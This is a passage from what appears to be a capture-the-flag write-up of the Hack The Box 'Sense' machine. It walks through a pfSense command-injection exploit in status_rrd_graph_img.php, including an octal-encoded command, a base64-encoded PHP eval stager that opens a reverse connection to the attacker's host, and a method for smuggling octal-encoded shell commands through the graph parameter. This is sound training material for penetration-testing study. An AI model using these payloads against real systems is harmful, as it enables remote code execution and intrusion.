154\147\172\125\152\126\152\122\61\126\167\123\125\150\172\132\61\153\171\122\156\160\141\125\60\106\165\131\172\116\123\145\126\160\130\122\156\122\113\145\155\71\156\123\153\144\112\132\60\170\161\115\107\144\141\142\153\160\163\127\126\144\122\142\60\160\111\124\130\116\112\121\61\112\172\127\154\143\60\144\107\115\172\125\156\154\151\122\61\132\61\123\60\116\123\141\125\164\124\141\172\144\112\122\60\160\65\127\154\144\107\143\153\71\65\121\155\160\132\127\105\65\163\123\125\116\153\145\155\111\171\124\156\112\141\127\106\106\165\124\62\154\102\141\61\154\160\121\130\126\121\125\60\112\66\131\152\112\117\143\154\160\131\125\155\132\152\142\126\132\157\127\153\116\156\141\62\116\65\144\62\144\113\122\63\150\163\131\155\153\170\145\155\122\111\123\156\116\141\126\172\122\166\123\153\144\112\143\105\164\125\143\62\144\132\142\153\160\163\127\126\144\172\116\60\154\111\115\107\144\155\125\60\106\162\125\152\102\64\125\106\106\162\122\153\61\126\115\130\116\165\131\154\150\117\142\155\115\171\117\127\160\150\145\127\122\153\123\125\121\167\132\60\160\111\124\124\144\112\121\61\112\111\126\105\125\65\121\61\106\126\145\106\122\130\145\127\122\60\131\172\112\153\145\155\111\171\124\156\112\131\115\61\111\61\131\60\144\126\142\154\150\124\121\124\154\112\121\61\112\66\127\104\116\123\116\127\116\110\126\124\144\112\122\62\170\164\123\125\116\157\142\107\126\111\125\155\170\151\142\153\65\167\131\152\111\61\132\155\112\110\117\127\150\141\122\61\132\162\123\60\116\153\145\155\122\130\141\110\132\152\115\155\170\61\123\156\154\162\132\60\160\160\127\127\144\150\126\172\126\167\127\104\112\153\142\107\122\104\132\62\65\152\115\61\132\166\131\152\116\117\143\107\112\56\160\116\127\170\154\122\61\132\161\132\106\150\123\144\155\116\160\116\127\164\150\127\105\65\157\127\127\61\64\142\106\147\171\126\152\112\132\126\63\144\165\123\61\116\162\132\62\126\65\121\127\164\152\115\61\132\166\131\152\116\117\143\107\112\163\117\127\154\154\127\105\112\157\131\172\116\116\117\126\153\172\123\155\170\132\127\106\112\163\127\104\112\141\115\127\112\164\124\152\102\150\126\172\154\61\123\60\116\152\142\153\170\104\121\127\164\132\141\127\163\63\123\125\116\123\145\155\122\130\141\110\132\152\115\155\170\61\127\104\112\113\116\127\116\110\122\156\160\152\145\127\144\167\124\63\154\103\117\125\154\110\126\156\116\152\115\154\126\156\132\130\154\103\142\107\122\164\122\156\116\114\121\61\112\160\123\61\122\172\132\62\132\124\121\155\164\150\126\61\126\166\123\61\122\172\113\123\153\67\51\51\73\77\76\47\40\76\40\122\103\115\156\160\161\144'
    echo '<?php eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKEx5bzhQM0JvY0NBdktpb3ZJR1Z5Y205eVgzSmxjRzl5ZEdsdVp5Z3dLVHNnSkdsd0lEMGdKekV3TGpFd0xqRTBMakV3SnpzZ0pIQnZjblFnUFNBME5EUTBPeUJwWmlBb0tDUm1JRDBnSjNOMGNtVmhiVjl6YjJOclpYUmZZMnhwWlc1MEp5a2dKaVlnYVhOZlkyRnNiR0ZpYkdVb0pHWXBLU0I3SUNSeklEMGdKR1lvSW5SamNEb3ZMM3NrYVhCOU9uc2tjRzl5ZEgwaUtUc2dKSE5mZEhsd1pTQTlJQ2R6ZEhKbFlXMG5PeUI5SUdsbUlDZ2hKSE1nSmlZZ0tDUm1JRDBnSjJaemIyTnJiM0JsYmljcElDWW1JR2x6WDJOaGJHeGhZbXhsS0NSbUtTa2dleUFrY3lBOUlDUm1LQ1JwY0N3Z0pIQnZjblFwT3lBa2MxOTBlWEJsSUQwZ0ozTjBjbVZoYlNjN0lIMGdhV1lnS0NFa2N5QW1KaUFvSkdZZ1BTQW5jMjlqYTJWMFgyTnlaV0YwWlNjcElDWW1JR2x6WDJOaGJHeGhZbXhsS0NSbUtTa2dleUFrY3lBOUlDUm1LRUZHWDBsT1JWUXNJRk5QUTB0ZlUxUlNSVUZOTENCVFQweGZWRU5RS1RzZ0pISmxjeUE5SUVCemIyTnJaWFJmWTI5dWJtVmpkQ2drY3l3Z0pHbHdMQ0FrY0c5eWRDazdJR2xtSUNnaEpISmxjeWtnZXlCa2FXVW9LVHNnZlNBa2MxOTBlWEJsSUQwZ0ozTnZZMnRsZENjN0lIMGdhV1lnS0NFa2MxOTBlWEJsS1NCN0lHUnBaU2duYm04Z2MyOWphMlYwSUdaMWJtTnpKeWs3.SUgwZ2FXWWdLQ0VrY3lrZ2V5QmthV1VvSjI1dklITnZZMnRsZENjcE95QjlJSE4zYVhSamFDQW9KSE5mZEhsd1pTa2dleUJqWVhObElDZHpkSEpsWVcwbk9pQWtiR1Z1SUQwZ1puSmxZV1FvSkhNc0lEUXBPeUJpY21WaGF6c2dZMkZ6WlNBbmMyOWphMlYwSnpvZ0pHeGxiaUE5SUhOdlkydGxkRjl5WldGa0tDUnpMQ0EwS1RzZ1luSmxZV3M3SUgwZ2FXWWdLQ0VrYkdWdUtTQjdJR1JwWlNncE95QjlJQ1JoSUQwZ2RXNXdZV05yS0NKTy5iR1Z1SWl3Z0pHeGxiaWs3SUNSc1pXNGdQU0FrWVZzbmJHVnVKMTA3SUNSaUlEMGdKeWM3SUhkb2FXeGxJQ2h6ZEhKc1pXNG9KR0lwSUR3Z0pHeGxiaWtnZXlCemQybDBZMmdnS0NSelgzUjVjR1VwSUhzZ1kyRnpaU0FuYzNSeVpXRnRKem9nSkdJZ0xqMGdabkpsWVdRb0pITXNJQ1JzWlc0dGMzUnliR1Z1S0NSaUtTazdJR0p5WldGck95QmpZWE5sSUNkemIyTnJaWFFuT2lBa1lpQXVQU0J6YjJOclpYUmZjbVZoWkNna2N5d2dKR3hsYmkxemRISnNaVzRvSkdJcEtUc2dZbkpsWVdzN0lIMGdmU0FrUjB4UFFrRk1VMXNuYlhObmMyOWpheWRkSUQwZ0pITTdJQ1JIVEU5Q1FVeFRXeWR0YzJkemIyTnJYM1I1Y0dVblhTQTlJQ1J6WDNSNWNHVTdJR2xtSUNobGVIUmxibk5wYjI1ZmJHOWhaR1ZrS0NkemRXaHZjMmx1SnlrZ0ppWWdhVzVwWDJkbGRDZ25jM1ZvYjNOcGJ.pNWxlR1ZqZFhSdmNpNWthWE5oWW14bFgyVjJZV3duS1NrZ2V5QWtjM1ZvYjNOcGJsOWllWEJoYzNNOVkzSmxZWFJsWDJaMWJtTjBhVzl1S0NjbkxDQWtZaWs3SUNSemRXaHZjMmx1WDJKNWNHRnpjeWdwT3lCOUlHVnNjMlVnZXlCbGRtRnNLQ1JpS1RzZ2ZTQmthV1VvS1RzKSk7));?>' > RCMnpqd
    

So it’s using to print a bunch of PHP code into a file, . I bet that code is the meterpreter stager.`echo``RCMnpqd`

The request in 5 is much shorter:

    GET /status_rrd_graph_img.php?database=-throughput.rrd&graph=file%7cphp%20RCMnpqd%7cecho%20 HTTP/1.1
    Host: 10.10.10.60
    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
    Cookie: PHPSESSID=83843109f2f66a131332333ab8c7e320;
    Connection: close
    

Un-URL-encoding gives:

    file|php RCMnpqd|echo 
    

It’s running the previous file with to execute it.`php`

If I wanted to make my own payload, the trick looks to be encoding it as octal (base-8), and then using to send it to .`printf``sh|echo`

For example, this octal will print to create a file in :`/tmp`

    oxdf@parrot$ printf '\164\157\165\143\150\040\057\164\155\160\057\060\170\144\146'
    touch /tmp/0xdf
    

I’ll send that in an HTTP request by visiting:

    https://10.10.10.60/status_rrd_graph_img.php/?database=-throughput.rrd&graph=file|printf%20%27\164\157\165\143\150\040\057\164\155\160\057\060\170\144\146%27|sh|echo
    

If I jump back into my shell, this file exists where it didn’t before:

    meterpreter > ls /tmp/0xdf
    100644/rw-r--r--  0  fil  2021-03-10 23:28:46 -0500  /tmp/0xdf
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/03/11/htb-sense.html)